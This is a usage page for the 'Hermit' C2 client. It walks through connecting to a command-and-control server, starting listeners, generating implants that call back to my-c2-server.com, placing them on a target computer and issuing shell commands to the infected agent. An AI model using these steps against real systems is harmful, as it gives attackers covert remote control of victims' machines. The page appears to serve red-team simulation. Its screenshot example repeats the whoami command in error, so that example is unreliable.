+++
title = "C2 Client"
date = 2024-01-02
[extra]
toc=true
+++

## Run (Connect to C2 Server)

First of all, execute `hermit client` command to connect the C2 server. Of course the C2 server needs to be running before that.

```sh
Hermit $ hermit client -H my-c2-server.com -P 9999
```

After connecting, the console will start.

<br />

## Help

```sh
Hermit $ help
```

<br />

## Listener

### Add New Listener

```sh
Hermit $ listener add -H my-c2-server.com -P 8000
```

Once the listener is added successfully, we can see it with `listeners` (or `listener list`) command.

```sh
Hermit $ listeners
```

<br />

### Start Listener

After adding a listener as the previous section, we can start it by `listener start <ID or Name>` command.

```sh
Hermit $ listener start 1
```

<br />

## Implant

### Generate Implant

We can generate implants with `implant gen` command with specifying a listener URL.

```sh
Hermit $ implant gen -l http://my-c2-server.com:8000/
```

After generating, we can see it by `implants` (or `implant list`) command.

```sh
Hermit $ implants
```

After that, we need to transfer the implant to target computer and execute it.

<br />

## Agent

When the agent has been registered by executing the implant, we can see it with `agents` (or `agent list`) command.

```sh
Hermit $ agents
```

<br />

### Interact with Agent

To interact with a specific agent for attacking, we can run `agent use <ID or Name>` command.

```sh
Hermit $ agent use 0
```

This command switches to the specified agent mode.

<br />

### Agent Mode: Send Task

After entering the agent mode, we can simulate various attack method e.g. shell command, screenshot, etc.  

- **Shell Command**

```sh
Hermit [agent: agent_0123456] $ shell whoami
```

- **Screenshot**

```sh
Hermit [agetn: agent_0123456] $ shell whoami
```

<br />

## Exit

To quit the console, run `exit` command.

```sh
Hermit $ exit
```